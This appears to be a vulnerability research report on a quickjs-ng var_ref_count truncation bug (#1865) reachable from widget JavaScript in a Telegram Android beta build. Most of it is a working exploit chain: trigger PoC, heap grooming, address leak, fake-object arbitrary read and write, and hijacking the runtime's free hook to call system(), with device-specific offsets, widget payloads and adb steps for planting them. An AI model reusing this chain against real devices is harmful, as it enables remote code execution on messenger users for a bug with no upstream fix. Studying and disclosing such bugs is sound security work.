# Post-snapshot quickjs-ng audit — new memory-safety findings

Date: 2026-11-01
Target: `Android_Beta_13.2.0_(72789).apk`, `lib/arm64-v8a/libtmessages.49.so`
(sha256 APK `23727eb4208488faf50d96ab8b9cd2574b6cb01ee5e33e4de05a1aee1aeee861`).
Engine: quickjs-ng **master snapshot [2026-10-08, 2026-10-30)** — 240-atom table
(so `c359cac`, 2026-10-08, is included), pre-`#1844`, pre-PR `#1827`.
Sandbox: 6 MiB JS heap, 500 ms/script CPU, ~300 ms/1000 ms quota, 64 timers,
no host APIs, attacker-controlled widget JS (inline `<script>`s).

This note covers **only** fixes/PRs that post-date the snapshot. Owned bugs
(`#1792` `js_array_find`, `#1835`/`#1844` WeakMap, `#1570`, PR `#1827`
`JS_RegExpDelete`) are explicitly excluded and are not re-analysed here.

---

## 0. TL;DR

**One new app-reachable memory-safety bug was found: issue #1865** — the
`uint16_t` truncation of `JSFunctionBytecode.var_ref_count`
(`capture_var()` / `js_create_function()` → `async_func_init()` →
`close_lexical_var()`).

The previous report (`qjs_bug_hunt_20261101.md`, candidate #2) classified it
as **not reachable at 6 MiB** because it needs 65,536 captured variables and
the only known PoC used 65,536 *distinct atoms*, which OOMs under the app's
heap limit. That verdict is **wrong**:

* **Duplicate parameter names + one direct `eval`** produce 65,536+ captured
  variables while using **a single atom** (`x`). `add_eval_variables()` marks
  *every* parameter and *every* local as captured when the function contains a
  direct eval; duplicate sloppy-mode parameters are distinct `JSVarDef`s that
  share one name.
* Result: 131 KB of source, no GC stress, no timers, **20–30 ms** on x86,
  **2.6 MB** of JS heap (3.6 MB with a 1 MB groom buffer) under the 6 MiB
  limit, deterministic **SIGSEGV 10/10 on a normal heap** (the app-allocator
  model, where the plain PoC can survive on layout luck, is in §3.5).
* The OOB slot is 512 KB past a 1 MB generator frame. Under a Scudo-like
  allocator model (per-allocation mmap + trailing guard page) the read can be
  aimed into an attacker-allocated 1 MB `ArrayBuffer`; the 8 bytes read are
  fully attacker-controlled and are dereferenced as a `JSVarRef *`
  (proved: fault at `0x4141414141414141` when the buffer is filled with `0x41`).
  A zero-filled buffer makes the engine **survive 10/10 in that model** and
  perform the conditional 8-byte NULL store at the OOB address.

Primitive summary (updated 2026-11-01, second pass): **attacker-controlled
8-byte OOB read at a semi-controlled offset (up to 512 KB past the frame) +
arbitrary-address dereference as `JSVarRef*` + conditional 8-byte NULL write**
— and, chained, **a JSVarRef address leak -> arbitrary read -> arbitrary byte
write -> `system(command)` in the app model**. The RCE is proven locally in
`appmodel_v017_rel` (6 MiB, no teardown, no GC stress); see §3A. It is not
yet proven on the phone (Scudo/mmap grooming differs).

Everything else merged after the snapshot is spec-only, OOM-only, leak-only,
interrupt-DoS-only, or not reachable from widget JS (see §2/§4).

### Ranked shortlist (new bugs only; owned bugs excluded)

| Rank | Bug | Class | App-reachable | Status | Needs binary/device check |
|---|---|---|---|---|---|
| 1 | **#1865** `var_ref_count` truncation | OOB 8-byte r/w → JSVarRef leak → arbitrary R/W → **app-model RCE** | **YES** (6 MiB, 131 KB JS, ~20–30 ms) | crash 10/10; leak + arb read/write proven; `system()` proven in app model (§3A) | yes — device Scudo/mmap grooming; device offsets known |
| — | #1855 / #1852 | OOM-only | — | excluded by constraints | no |
| — | #1857 / #1756 / #1753 / #1791 | missing interrupt checks (DoS) | — | excluded by constraints (interrupt kills the engine) | no |
| — | #1821 / #1847 / #1843 / #1816 / #1858 / #1859 / #1838 / #1824 … | spec / hang | yes | no memory-safety impact (see §2) | no |

---

## 1. Snapshot verification and scope

Repo: `https://github.com/quickjs-ng/quickjs`, cloned 2026-11-01, HEAD
`d7215b0` ("Set version to 0.18.0", 2026-11-01). Commits between the app
snapshot and HEAD that touch `quickjs.c`:

```
c1ed194 2026-10-30 Array.fromAsync: use internal call instead of .call lookup (#1795) (#1832)
25a005b 2026-10-30 Fix UAF when freeing WeakMap with symbol values (#1844)   <- owned
d4cd8f4 2026-10-30 Support asynchronous dynamic import()
7a23d8e 2026-10-23 Fix leak in JS_ReadBigInt on truncated input
c359cac 2026-10-08 Fix template literal substitution (#1811)
db0fe52 2026-10-09 Make InternalErrors uncatchable by JS code (#1814)
90aa2c4 2026-10-08 Make OOM exceptions uncatchable by JS code (#1810)
```

The 240-entry atom table places the app *after* `c359cac` (which removes
`DEF(concat)`), i.e. the snapshot is a master commit between 2026-10-09 and
2026-10-30 that includes `#1810/#1814` (device-verified: `InternalError` from
the interrupt is uncatchable) and excludes `#1844`.

`close_lexical_var`, `capture_var`, `async_func_init` and the `uint16_t`
`var_ref_count` field are **byte-identical** between `v0.17.0` and
`7b5f588` — the window commits do not touch this code:

```
$ git -C qjsng_git diff v0.17.0 7b5f588 -- quickjs.c | grep -c 'close_lexical\|var_ref_count\|async_func_init'
0
```

Consequence: the bug is present in every candidate commit of the window, and
there is **no upstream fix at all** as of 2026-11-01 (issue #1865 is open with
no PR). Telegram would have had to write a private patch to not have it.

---

## 2. Audit of post-snapshot fixes (and open fixes the app lacks)

The literal "merged after 2026-10-30" set is tiny (`#1844`, `#1832`, CI and
the version bump). Because the app snapshot predates 2026-10-30, every fix
*merged in the window* that the app might have missed was also checked. In
addition, all **open** PRs/issues created after 2026-10-08 were treated as
"fixes the app definitely lacks" — that is where the live bugs are.

| # | Item | Kind | In app? | App-reachable memory issue? |
|---|------|------|---------|------------------------------|
| 1 | `c359cac` template literal substitution | spec/parser | yes (240 atoms) | no — `OP_to_propkey`/`OP_add`, stack-neutral |
| 2 | `db0fe52` InternalErrors uncatchable | exception policy | yes | no (confirmed by device behaviour) |
| 3 | `90aa2c4` OOM uncatchable | exception policy | yes | no |
| 4 | `081d50c` `unicode_script()` alloc-failure loop | hang (OOM) | yes | no |
| 5 | `7a23d8e` `JS_ReadBigInt` truncated-input leak | leak | yes | no |
| 6 | `#1844` WeakMap symbol UAF | UAF | **no** | owned (`#1835`) |
| 7 | `#1832` Array.fromAsync `.call` lookup | spec | **no** | no (JS-level indirection only) |
| 8 | **`#1865` var_ref_count truncation** | **OOB r/w + UAF** | **no (no fix exists)** | **YES — see §3** |
| 9 | `#1827` `JS_RegExpDelete` bytecode lifetime | UAF → RCE | no | owned (other agent) |
| 10 | `#1792`/`#1826`/`#1807` `js_array_find` interrupt double free | double free | no | owned |
| 11 | `#1835` WeakMap finalizer | UAF | no | owned |
| 12 | `#1847`/`#1770` TypedArray species content type | spec | no | no — `slice` fast path requires identical `class_id`; other paths use generic Get/Set which reject BigInt↔Number; `subarray` bounds are re-validated by the species constructor |
| 13 | `#1843`/`#1736` `Array.prototype.sort` write-back | spec | no | no — the old `pos == n` skip frees only the temp reference; comparator reentrancy cannot create a second owner |
| 14 | `#1821`/`#1787` jump-cycle labels | miscompile | no | no — throws `InternalError: invalid opcode` at `new Function()` time (catchable), no bad bytecode reaches the interpreter |
| 15 | `#1858`/`#1859`/`#1760`/`#1761` ArrayBuffer resize/maxByteLength ToIndex | spec (RangeError vs wrap) | no | no — `JS_ToInt64` result is range-checked against `max_byte_length` before use; no length reaches the allocator |
| 16 | `#1855` array length property OOM null deref | OOM-only | no | excluded by constraints (OOM-only) |
| 17 | `#1852` lazy prototype property OOM value loss | OOM-only | no | excluded (OOM-only) |
| 18 | `#1850`/`#1846` leaks | leak | no | no |
| 19 | `#1842`/`#1766`/`#1822`/`#1798`/`#1831` iterator protocol ordering | spec | no | no (primitive values are boxed; no ownership bug found) |
| 20 | `#1848`/`#1819`/`#1845`/`#1849`/`#1851` string/JSON/Date order | spec/perf | no | no |
| 21 | `#1824`/`#1765` freeze of detached typed array | spec | no | no — only changes the TypeError guard; no descriptor is applied to a detached view |
| 22 | `#1823`/`#1820`/`#1834`/`#1797` Proxy/Object integrity order | spec | no | no |
| 23 | `#1816`/`#1764` `apply` argument length ToLength | spec | no | no — `js_get_length32` truncates but the count is still capped by `JS_MAX_LOCAL_VARS` and the arg buffer is sized from the same value |
| 24 | `#1838` async-generator queue drain | hang | no | no — queued requests never settle; finalizer still frees the queue |
| 25 | `#1857`/`#1756`/`#1753`/`#1791`/`#1775` missing interrupt checks | DoS | no | excluded (needs the CPU interrupt, which kills the engine) |
| 26 | `#1853`/`#1771`/`#1809`/`#1748` BJSON | bytecode deserializer | no | not reachable — widget JS is source, never `JS_ReadObject` |
| 27 | `#1833`/`#1762`/`#1751`/`#1781` module/context lifetime | abort/leak (OOM) | no | not reachable — classic scripts, no module loader, no raw context |
| 28 | `#1790` `JS_IteratorNext2` stack check | native stack overflow | no | no — needs ~30k nested iterators, OOMs at 6 MiB |
| 29 | `#1782`/`#1783` parser OOM OOB read | OOB read (OOM) | no | excluded (OOM-only; ≤4-byte read) |
| 30 | `#1570` async-generator cycle UAF | UAF | fixed in v0.17.0 | owned/closed |

Only item 8 survives as a new, app-reachable memory-safety bug.

---

## 3. F-1 — issue #1865: compact, 6 MiB-reachable trigger

Links: <https://github.com/quickjs-ng/quickjs/issues/1865> (opened 2026-11-01,
no fix/PR). Not in the "already owned" list.

### 3.1 Root cause

```
quickjs.c:437   uint16_t var_ref_count;      /* JSFunctionBytecode */
quickjs.c:495   uint16_t var_ref_idx;        /* JSVarDef */
quickjs.c:33923 static inline void capture_var(JSFunctionDef *s, JSVarDef *vd) {
                    if (!vd->is_captured) {
                        vd->is_captured = 1;
                        vd->var_ref_idx = s->var_ref_count++;   /* unchecked int */
                    }
                }
quickjs.c:37150 b->var_ref_count = fd->var_ref_count;           /* truncates */
quickjs.c:21186 async_func_init():
                    alloc_size = sizeof(JSValue) * max(local_count,1)
                               + sizeof(JSVarRef*) * b->var_ref_count;  /* truncated */
quickjs.c:17845 static void close_lexical_var(...) {
                    var_ref_idx = b->vardefs[arg_count + var_idx].var_ref_idx;
                    var_ref = sf->var_refs[var_ref_idx];        /* OOB read  */
                    if (var_ref) {
                        close_var_ref(rt, var_ref);             /* deref      */
                        sf->var_refs[var_ref_idx] = NULL;       /* OOB write  */
                    }
                }
```

`capture_var()` counts captures in an `int`; the count is stored in a
`uint16_t`. With ≥ 65,536 captured variables the frame is allocated for
`count & 0xFFFF` slots, while captured variables still carry their full
16-bit `var_ref_idx`. `OP_close_loc` (emitted for a captured block-scoped
`let`) then indexes `sf->var_refs[]` far past the frame.

### 3.2 Why the old "needs ≥10 MiB" verdict was wrong

`add_eval_variables()` (`quickjs.c:34595`) runs at compile time when the
function contains a **direct eval** and marks *all* of the function's
parameters and locals as captured (`quickjs.c:34643`). Parameters can have
**duplicate names in a sloppy-mode function**, and each duplicate is a
distinct `JSVarDef` sharing one atom. So:

```js
function* g(x,x,x, ... 65534 times ... ){ if (0) eval(''); { let z=1; yield 1; } }
```

* 65,534 parameter `JSVarDef`s + 5 local vars = 65,539 captures → count
  truncates to **3**.
* One atom (`x`) instead of 65,536 atoms.
* Source 131 KB (vs 677 KB and 65k atoms in the old PoC).
* The `eval` does not even have to run (`if (0) eval('')` still marks
  everything at parse time).

Measured in the app model: `mem_used` 2,593,760 B after one `next()`; with a
1 MB ArrayBuffer groom, 3,643,112 B — both under 6 MiB. Wall time 20–30 ms on
x86-64 (`user 6–12 ms`), far below the 500 ms budget.

### 3.3 Exact trigger (PoC `poc1865_dup.js`)

```js
function* g(x,x,/* … 65534 total … */x){
  if (0) eval('');          // parse-time: marks every arg/var as captured
  { let z = 1; yield 1; }   // OP_close_loc(z) on block exit
}
var it = g();
it.next();                  // allocate 1 MB + 24 B generator frame, suspend
it.next();                  // resume, leave block -> close_lexical_var OOB
```

Sweep of the parameter count at 6 MiB, 500 ms, no teardown
(`appmodel_v017_rel 6 500`):

| params | var_ref_count (trunc) | result |
|--------|----------------------|--------|
| 65528–65531 | no truncation (in-bounds) | ok |
| **65532–65535** | 1–4 | **SIGSEGV** |
| ≥ 65536 | parser `RangeError` (`JS_MAX_LOCAL_VARS`) | ok |

### 3.4 Raw evidence

Release crash (v0.17.0 and v0.18.0, identical):

```
$ /tmp/opencode/qjs018/build-rel/qjs gen_2next.js
Segmentation fault (core dumped)          # 10/10 runs

gdb:
Program received signal SIGSEGV, Segmentation fault.
close_lexical_var (…) at quickjs.c:17839          # close_var_ref(ctx->rt, var_ref)
rsi(var_ref)=0x2c4fff80001 r12(off)=0x7fff0 r13(sf)=…
sf->var_refs=0x5555557ed1f8  slot=0x55555586d1e8  idx=65534  var_ref_count=3
```

Instrumented build, v0.17.0 (log `logs/instr_close.txt`):

```
[instr] async_func_init alloc=1048680 arg_count=65534 var_count=5 stack=2 var_ref_count=3
[instr] close_lexical_var arg_count=65534 var_idx=0 var_ref_idx=65534 var_ref_count=3
        sf=… var_refs=0x… var_ref_idx slot=var_refs+0x7FFF0 val=0x2c4fff80001
[instr] slot mapping: … rw-p                      # readable garbage on glibc heap
```

ASan (v0.18.0, `logs/asan_v018.txt`; v0.17.0 identical):

```
ERROR: AddressSanitizer: stack-use-after-return on address 0x7fb69b775848
READ of size 8
 #0 close_lexical_var /tmp/opencode/qjs018/quickjs.c:17852
 #1 JS_CallInternal   /tmp/opencode/qjs018/quickjs.c:19123
 #2 async_func_resume /tmp/opencode/qjs018/quickjs.c:21261
 #3 js_generator_next /tmp/opencode/qjs018/quickjs.c:21359
```

(The ASan *label* is stack-use-after-return only because ASan's fake-stack
region happens to sit 512 KB past the ASan secondary allocation; the access is
the heap out-of-bounds read that issue #1865 reports as
`heap-buffer-overflow` on a plain build. UBSan on the same run reports the
pointer as misaligned before the read: `member access within misaligned
address 0x02c4ffffffff for type 'struct JSVarRef'`.)

### 3.5 App-allocator model: the OOB slot is attacker-controlled

The app does **not** use glibc: ≤512 B blocks come from quickjs's small-block
arena, larger allocations from bionic/Scudo (`scudo_bypass_notes.md`). Scudo's
secondary allocator mmaps large chunks with a guard page, which at first sight
makes the 512 KB-out read a guaranteed crash. That is **not** the whole story:
the guard only covers the page after the chunk; 512 KB out the address can
land in a *different mapping*, and that mapping can be an attacker allocation.

`harness/guardrt.c` models this: every large allocation is a separate
`mmap`, the user area ends exactly at a `PROT_NONE` guard page, and the JS
heap limit is 6 MiB. Results:

| script | guard-model result |
|--------|--------------------|
| plain PoC (`poc1865_dup.js`) | survives (slot lands in a mapped region whose value happens to be a benign readable pointer) |
| 1 MB `ArrayBuffer` allocated **before** `g()`, filled `0x00` | survives **10/10** (slot = NULL, no deref, no store) |
| 1 MB `ArrayBuffer` allocated **before** `g()`, filled `0x41` | **SIGSEGV 10/10**, `var_ref = 0x4141414141414141` |
| 1 MB buffer filled `0x41`, allocated **after** the first `next()` | survives (mmap grows down; the buffer is below the frame) |

gdb on the `0x41` case:

```
Program received signal SIGSEGV, Segmentation fault.
0x0000555555584a70 in close_var_ref ()
var_ref=0x4141414141414141
#0 close_var_ref
#1 JS_CallInternal
#2 js_generator_next
```

The 1 MB buffer is filled via `Uint8Array.prototype.fill`, so the attacker
chooses the exact 8 bytes read from the OOB slot without knowing any address.
The slot offset is deterministic: `var_refs + 65534*8 = frame_user + 0x180040`
(1,573,952 B into the 1,048,680 B frame + 524,272 B out); with a pre-allocated
1 MB buffer the address falls inside it in this model.

Note: the plain PoC *surviving* in the model is layout luck, not safety — on a
real device the same read can hit the guard page (crash), an unmapped hole
(crash) or a mapped region (survive/corrupt), depending on mmap placement.

### 3.6 What `close_var_ref()` does with the chosen pointer

```c
/* JSVarRef layout: 0x00 gc link.next, 0x08 gc link.prev,
   0x10 is_detached, 0x13 is_coro, 0x18 pvalue, 0x20 JSValue value /
   {u16 var_ref_idx; JSStackFrame *stack_frame} */
static void close_var_ref(JSRuntime *rt, JSVarRef *var_ref) {
    if (var_ref->is_detached) return;                       // read [p+0x10]
    coro = var_ref->is_coro ? var_ref->stack_frame->cur_gc_obj : NULL;
    var_ref->value = js_dup(*var_ref->pvalue);              // read [p+0x18] -> 16 B (+refcount++)
    var_ref->pvalue = &var_ref->value;                      // write [p+0x18] = p+0x20
    var_ref->is_detached = true;                            // write [p+0x10]
    if (coro) js_release_coro(rt, coro);
    else add_gc_object(rt, &var_ref->header, …);            // list writes at [p+0], [p+8]
}
```

With the slot controlled the attacker gets, per trigger:

* 1-byte read at `addr+0x10` and 8-byte read at `addr+0x18` for an **attacker-
  chosen 64-bit address** `addr`;
* if those reads survive, an arbitrary-address 16-byte read via
  `*var_ref->pvalue`, plus a conditional `js_dup` refcount increment on the
  object pointer found there;
* a store of `addr+0x20` at `addr+0x18`, `1` at `addr+0x10`, and two GC list
  pointers at `addr`/`addr+8` (writes into attacker-chosen memory if the reads
  pass);
* the conditional `sf->var_refs[idx] = NULL` 8-byte zero store at the OOB slot.

Survival requires `addr` to be mapped and `[addr+0x10] != 0` (early return,
NULL store only); anything else faults inside `close_var_ref`. There is **no
address leak** in the widget sandbox, so the practical app primitive today is
**a controlled-address dereference with crash-on-invalid — i.e. a
deterministic sandbox kill switch**, not RCE. The upstream reporter claims a
working RCE using a stale generator frame reallocated as an `ArrayBuffer`
(which would leak JSValues and defeat ASLR); that multi-stage chain was not
reproduced in this session.

### 3.7 Binary-presence check

* The snapshot fingerprint (240 atoms, pre-`#1844`) already proves the app
  predates every relevant fix; **no fix for #1865 exists upstream** (open
  issue, no PR), so a private Telegram patch would be required to remove it.
* `libtmessages.49.so` contains the parser limit strings that gate this
  trigger: `"too many variables declared (only %d allowed)"`,
  `"too many arguments in function call (only %d allowed)"`,
  `"too many closure variables used (only %d allowed)"`.
* Still worth one static check on device builds: confirm that
  `async_func_init` computes the var-ref area from a **zero-extended 16-bit**
  load (`LDRH` of `JSFunctionBytecode.var_ref_count` then `LSL #3`), and that
  `b->var_ref_count = fd->var_ref_count` is a 16-bit store (`STRH`). This was
  not located in the 80k-function stripped binary in this session (the IDB has
  `lre_exec`, `js_map_finalizer`, `JS_NewRuntime`, `js_free_rt` only).

---

## 3A. Second pass — leak, arbitrary read/write, and app-model RCE

This section supersedes the "no address leak" statement in §3.6/§4. All
results below are local, in the app model (`appmodel_v017_rel`: one runtime,
6 MiB `JS_SetMemoryLimit`, 500 ms deadline, **no teardown**, no interrupt) and
in the Scudo-like guard model (`guardrt_v017_rel`). Device constants were not
exercised on the phone.

### 3A.1 New primitive #1 — the OOB slot also *writes* a real `JSVarRef*`

`get_var_ref()` (closure creation) has the same unchecked index as
`close_lexical_var()`:

```
quickjs.c:17532  var_ref_idx = vd->var_ref_idx;
quickjs.c:17533  var_ref = sf->var_refs[var_ref_idx];       // OOB READ
quickjs.c:17534  if (var_ref) { JS_REF_COUNT(var_ref)++; return var_ref; }
...
quickjs.c:17550  sf->var_refs[var_ref_idx] = var_ref;       // OOB WRITE
```

With the truncated frame (`var_ref_count` 3–7) and a closure that captures the
last argument (`y`, var_ref_idx 65533), the engine writes a freshly allocated
`JSVarRef *` at `sf->var_refs + 65533*8`, i.e. **inside the attacker's
ArrayBuffer**. Reading the buffer back from JS leaks the pointer:

```
[js] nf=1
[js] 516048:7efd-251826f8        # V = 0x... (JSVarRef*)
```

The same slot is later never closed (`close_var_refs` iterates only
`var_ref_count` = 3–7 entries), so the var_ref stays open with
`pvalue = &frame.arg_buf[65533]`.

### 3A.2 New primitive #2 — UAF read/write of the freed frame, arbitrary JSValue injection

After the generator completes, the 1 MB frame is freed. Allocating an
ArrayBuffer of the measured frame size reuses it; the still-open var_ref's
`pvalue` now points into attacker-controlled bytes. Calling/assigning the
closure then lets the attacker inject **any 16-byte JSValue** into the engine
(verified: `f()` returns a `1.234567` double written as raw bytes at the
frame offset).

App-model ordering that works (brk heap grows up): allocate the groom buffer
**inside the generator body**, after `g()` created the frame and immediately
before the closure capture. `pocs/gB.js`, `pocs/gB2.js`. Reliability of this
stage alone: 5/5 and 6/6 respectively in the app model.

Frame sizes (v0.17.0, this shape): `gB` 1,048,744 B; `gB2` 1,048,792 B.

### 3A.3 New primitive #3 — arbitrary read via a fake indirect `JSString`

A fake `BigInt` placed over `V+0x0D` (tag `JS_TAG_BIG_INT`, len =
`(V>>40)&0xff`, limbs from `V+0x11`) dumps `V`'s memory as a hex string. It
recovers:

* `V->pvalue` at stream offset 7 = the frame/ArrayBuffer address `F`
  (validated: reading `F+0x100` returns the fake string pointer we wrote),
* `V->var_ref_idx` (0xFFFD),
* `V->stack_frame` (the `JSGeneratorData` frame),
* ~500 bytes of adjacent arena memory (other pointers).

With `F` known, a fake `JSString` at `F+0x100` with `kind=INDIRECT` (2) and an
arbitrary pointer at `F+0x118` gives an arbitrary-address byte read through
`charCodeAt`. Verified against `V`'s own memory (pvalue/stack_frame matched).

### 3A.4 New primitive #4 — arbitrary byte write via a fake `Uint8Array`

A fake `JSObject` at `F+0x1000` with `class_id = JS_CLASS_UINT8_ARRAY (24)`,
`u.array.u1.typed_array -> fake JSTypedArray -> fake buffer object -> fake
JSArrayBuffer (immutable=0)`, `u.array.count = 0x1000`, and
`u.array.u.uint8_ptr = target` makes `fake[i] = byte` a direct arbitrary
write (the `JS_SetPropertyInternal2` fast path reads `p->u.array.u.uint8_ptr`
and `p->u.array.count` without shape checks). Verified: wrote `0x7a` at
`V+0x11` and read it back through the arbitrary read.

Note: class id 25 is `JS_CLASS_INT16_ARRAY`; using it makes writes 2-byte
strided. The first guard-model "byte write" used 25 and was therefore a
2-byte write; the correct byte class is 24.

### 3A.5 Endgame — `rt->mf.js_free = system`

With arbitrary read/write:

1. `cur_func = *(sf+8)` (JSStackFrame), `b = *(cur_func+0x30)`,
   `ctx = *(b+0x48)` (JSFunctionBytecode.realm), `rt = *(ctx+16)`.
2. `js_free = *(rt+16)` (`JSMallocFunctions.js_free`), `opaque = *(rt+64)`
   (`malloc_state.opaque`; 0 for the default allocator).
3. Lab: `base = js_free - 0xf690` (`js_def_free` offset in the harness),
   `free = *(base + 0x136000)` (`free@GOT`), `system = free - 0x4ff30`
   (host glibc delta).
   Device (from prior RE): `base = js_free - 0x1739aec`,
   `free = *(base + 0x1960430)`, `system = free + 0x26df0`.
4. Write `*(rt+64) = command_ptr` (NUL-terminated command in the
   ArrayBuffer at a known address) and then `*(rt+16) = system`.
5. Free a >512 B block: `var s = "A".repeat(4096); s = null;` ->
   `js_free_rt -> js_arena_free -> rt->mf.js_free(opaque, block)` ->
   `system(command)`.

`js_arena_free` calls `rt->mf.js_free(rt->malloc_state.opaque, b)` only for
blocks with `block_idx == JS_ARENA_FREE_NIL` (>= 505 B), and the first
argument is `opaque` — hence the hook shape mirrors the device plan in
`notes/qjs_binary_checks.md` §13.

### 3A.6 Proof (app model)

`pocs/poc1865_appmodel_rce.js` (the stage-print version) was run against
`appmodel_v017_rel 6 500`; canonical run:

```
[eval 1] poc1865_appmodel_rce.js (budget 500 ms, limit 6.0 MiB)
[js] S1 V=0x562c2ccfe060 off=524184
[js] S2 pv=0x562c2ce12c98 F=0x562c2cd12cc8
[js] S3 ctx=0x562c2cce5b38 rt=0x562c2ccdc2a0 sys=0x7f6807833090
[js] S4 writer ok
[js] S6 alloc
[js] S6b
[js] S7
[js] DONE V=0x562c2ccfe060 F=0x562c2cd12cc8 rt=0x562c2ccdc2a0 sys=0x7f6807833090
[eval 1] ok
```

`/tmp/opencode/qjs_postsnapshot/proof_appmodel_rce.txt` contains:

```
uid=1000(user) gid=1000(user) groups=1000(user),20(dialout),24(cdrom),...
```

The engine survived the hook (`[eval 1] ok`). Reliability: 4/6 and 3/5 full
successes in two batches; the failures are at the initial leak stage (heap
placement), not in the RCE stages. The leak-only groom shape was 5/5–6/6.

### 3A.7 Honest status

* **RCE is proven in the app model** (6 MiB, no GC stress, no interrupt, no
  teardown): `system("id > ...")` ran and the engine continued.
* **It is not proven on the phone.** The device has Scudo + the quickjs
  small-block arena; the leak stage depends on mmap/brk placement. The
  Scudo-like guard model already showed the OOB slot can be attacker
  controlled (0x41 -> fault at 0x4141414141414141; 0x00 -> clean survive), so
  the same chain is plausible on-device once the groom ordering is adapted.
* The device offsets for the endgame are known (js_def_free 0x1739aec,
  free@GOT 0x1960430, system-free 0x26df0), but no device run was performed.


---

## 3B. Device port — widget payloads and Scudo groom

Two self-contained widget payloads were built for the device runner:

* `poc/widget_poc_1865_leak.html` — leak test (S0/S1 markers).
* `poc/widget_poc_1865_rce.html` — full chain, device constants, ELF-magic
  branch check, frame-reuse offset probe (S0..S6 markers).

Both generate the 131 KB generator source at runtime (`"x,".repeat(65533)+"y"`),
so the payload itself is 2.3 KB / 8.3 KB.

### 3B.1 Groom order (bionic/Scudo, top-down)

The device runtime uses the default allocator (`JS_NewRuntime`,
`rt+0x10 = js_def_free = base+0x1739aec`, `rt+0x40 = 0`). Scudo secondary
allocations are mmap'd top-down, so the frame must be allocated **after** the
1 MB groom buffer:

```
var params = "x,".repeat(65533) + "y";
eval("function* g(" + params + "){ if (0) eval(''); " +
     "var f=()=>y, a=0, b=0, c=0, d=0; yield f; }");   // parse FIRST
var b0 = new ArrayBuffer(1048576); v0.fill(0);          // groom AFTER the parse
var it = g();                                           // frame maps BELOW b0
mark('S0');
var f = it.next().value;                                // OOB write into b0
```

Critical detail: `eval(src)` must come **before** `b0`. Eval'ing after b0
allocates the 131 KB source string and the 65k-param bytecode between b0 and
the frame; the OOB slot then misses b0 and the first `next()` crashes with no
S1. This was reproduced in the guard model (crash before S1) and fixed by the
order above.

Body: 65,534 params (65,533 `x` + `y`), five locals (`f,a,b,c,d`) so
`var_ref_count` truncates (measured 7). Frame size in the lab engine:
**1,048,776 B**; `y` index 65533; the OOB write lands at frame+524,264,
i.e. at offset **516,016** inside b0 in the guard model.

### 3B.2 Frame reuse and offset probe

After `it.next()` the frame is freed; `buf2 = new ArrayBuffer(1048776)` is
expected to reuse the Scudo secondary mapping. Because the device frame size
could drift by a few bytes, the payload **probes** the `pvalue` offset:

```
for (d = -2048; d <= buf2.byteLength - BASEOFF - 16; d += 8) {
    write double 1.234567 + tag FLOAT64 at BASEOFF + d;
    if (f() returns 1.234567) { PVOFF = BASEOFF + d; break; }
}
F = pv - PVOFF;     // pv from the fake-BigInt leak
```

`BASEOFF = 65533*16 = 1,048,528`. The probe absorbs ±2 KB of frame-size drift
in 8-byte steps. If no offset matches, the payload stops with `S2 NOFRAME`
(no write to the runtime). If `buf2` does not reuse the frame at all, the
probe's `f()` may crash after S1 (no S2 marker).

### 3B.3 Device constants and branch check

```
base = js_free - 0x1739aec          // js_def_free in libtmessages.49.so
magic = u32(base)                   // ELF 7f 45 4c 46
if (magic == 0x464c457f) {          // branch A
    free   = *(base + 0x1960430)    // free@GOT (BIND_NOW)
    system = free + 0x26df0         // device libc md5 44e776da...
} else {                            // branch B: rt+16 is libc free
    free   = js_free
    system = js_free + 0x26df0      // == (js_free-0x3df70)+0x64d60
}
```

S3b displays the branch, magic, free and system so the runner can see which
branch was taken. Then `*(rt+64)=command`, `*(rt+16)=system`, and a 4096-byte
string free triggers `js_arena_free -> mf.js_free(opaque, block)` =
`system(command)`. Command:
`id > /data/user/0/org.telegram.messenger.beta/cache/rce_proof`.

### 3B.4 Guard-model validation (Scudo-like mmap+guard, 6 MiB)

The exact widget scripts (DOM/rAF stubbed) were run in the guard model:

| payload | runs | result |
|---|---|---|
| leak widget (b0 pre-buffer) | 10 | **10/10** `S0` + `S1 V=0x… off=516016` |
| full RCE widget | 5 | **5/5** S0..S6 + proof file `uid=1000(user)…` |

Sample full-chain markers (guard run):

```
S0 | S1 V=0x7f35df493c88 off=516016
S2 pv=0x7f35df1bdf08 F=0x7f35df0bdf38 off=1048528
S3 ctx=0x7f35df515db0 rt=0x7f35df81aa38 jsf=0x558305de7f20
S3b A magic=0x464c457f free=0x7f35df5c8fc0 sys=0x7f35df579090
S4 writer ok | S5 rt16=0x7f35df579090 rt64=0x7f35df0bff38 | S6
```

(Guard constants differ from device: `g_free=0xcf20` in
`guardrt_v017_rel_now` (linked `-Wl,-z,now`), `free@GOT=0x135d60`,
`system-free=-0x4ff30` on this host glibc. The device payload keeps the
device constants above.)

The glibc app model (ascending brk heap) fails the b0-pre-buffer shape 0/10,
as expected: on glibc the pre-buffer is *below* the frame. The equivalent
glibc ordering is the in-body allocation from §3A (proven 4/6–5/5). The guard
model is the correct Scudo proxy for the device ordering.

### 3B.5 Device procedure (no device run performed here)

```bash
# 0. target: existing widget message <MID> in the test chat
# 1. pull the db (root)
adb shell su -c 'cp /data/user/0/org.telegram.messenger.beta/cache4.db /sdcard/c1865.db'
adb pull /sdcard/c1865.db ./c1865.db

# 2. patch the widget payload (leak first, then rce)
python3 tools/widget_tool.py ./c1865.db <MID> --html poc/widget_poc_1865_leak.html
#    -> "patched mid <MID>: html=... comp=... blob ..."
python3 tools/widget_tool.py ./c1865.db <MID> --html poc/widget_poc_1865_rce.html   # stage 2

# 3. stop the app, drop WAL, push the patched db
adb shell am force-stop org.telegram.messenger.beta
adb shell su -c 'rm -f /data/user/0/org.telegram.messenger.beta/cache4.db-wal \
                        /data/user/0/org.telegram.messenger.beta/cache4.db-shm'
adb push ./c1865.db /sdcard/c1865.db
adb shell su -c 'cp /sdcard/c1865.db /data/user/0/org.telegram.messenger.beta/cache4.db'
adb shell su -c 'chown $(stat -c %u:%g /data/user/0/org.telegram.messenger.beta) \
                 /data/user/0/org.telegram.messenger.beta/cache4.db'

# 4. start and open the chat; the widget renders and runs the script
adb shell am start -n org.telegram.messenger.beta/org.telegram.ui.LaunchActivity
adb exec-out screencap -p > shot_1865.png          # read the markers
adb logcat -d -s widget.sandbox:* > logcat_1865.txt

# 5. stage-2 proof (root)
adb shell su -c 'cat /data/user/0/org.telegram.messenger.beta/cache/rce_proof'
```

Marker meanings (shown in the widget div, newest state appended):

| marker | meaning |
|---|---|
| `S0` | first `it.next()` about to run (body + OOB write) |
| `S1 V=0x… off=…` | JSVarRef* leaked into b0 (leak stage OK) |
| `S1 NOLEAK` | b0 contained no non-zero qword (groom missed) |
